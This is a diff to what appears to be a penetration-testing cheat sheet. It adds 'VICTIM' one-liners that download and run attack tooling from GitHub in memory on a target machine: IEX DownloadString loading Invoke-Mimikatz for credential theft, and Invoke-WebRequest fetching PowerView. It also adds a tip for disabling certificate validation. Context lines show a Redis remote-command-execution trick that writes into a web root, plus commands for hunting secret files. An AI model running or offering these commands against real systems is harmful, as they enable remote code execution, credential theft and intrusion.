@@ -138,7 +138,19 @@ stty -rows 48 -columns 120
 
 - VICTIM: `(New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')`
 
-## Redis
+## PowerShell - IEX
+- VICTIM: `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')`
+ 
+- VICTIM: `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
+
+## PowerShell Invoke-WebRequest (PowerShell 3.0 and higher)
+- VICTIM: `Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1`
+
+USE:
+- -UseBasicParsing
+- [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
+
+# Redis
 
 https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
 
@@ -152,7 +164,7 @@ config set dir /var/www/html/
 
 save
 
-## Search files
+# Search files
 
 - dir secret.doc /s /p (Windows)
 - find -O3 -L /var/www/ -name "\*.html" (Linux)
